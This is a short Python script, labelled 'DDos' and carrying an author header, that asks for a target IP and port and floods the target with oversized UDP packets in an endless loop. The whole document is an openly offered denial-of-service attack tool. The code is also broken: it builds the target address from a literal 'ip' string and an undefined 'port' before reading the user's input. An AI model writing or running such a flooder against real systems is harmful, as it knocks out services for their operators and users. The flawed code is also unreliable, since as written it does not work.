"""
========================================
Name:DDos   Author: Lalevin Martin
 Mailbox: zzlyxht@outlook.com                                                
 Github: http://github.com/su-57g  
Written in 2023-5-3
==================NACG==================
"""
import socket
import os
os.system("clear")

target_addr = ('ip', port)
ip = input("请输入 IP     : ")
port = int(input("攻击端口      : "))


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

data = 'A'*65500

while True:
    try:
        sock.sendto(data.encode(), target_addr)
    except:
        print('An error occurred')